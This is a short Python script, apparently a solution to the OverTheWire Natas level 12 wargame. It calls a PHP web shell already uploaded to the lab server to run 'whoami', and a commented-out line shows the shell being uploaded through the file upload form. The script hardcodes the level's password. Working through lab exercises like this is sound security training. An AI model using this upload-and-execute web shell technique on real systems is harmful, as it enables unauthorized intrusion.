#!usr/env/python3

import requests

username = 'natas12'
url = 'http://%s.natas.labs.overthewire.org/upload/x6dkckoqhw.php?c=whoami;' % username
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

session = requests.session()
connection = session.get(url, auth = (username, password))
#connection = session.post(url, files = {"uploadedfile":open('natas12shell.php', 'rb')}, data= {"filename":"natas12shell.php"},auth = (username, password))
print(connection.text)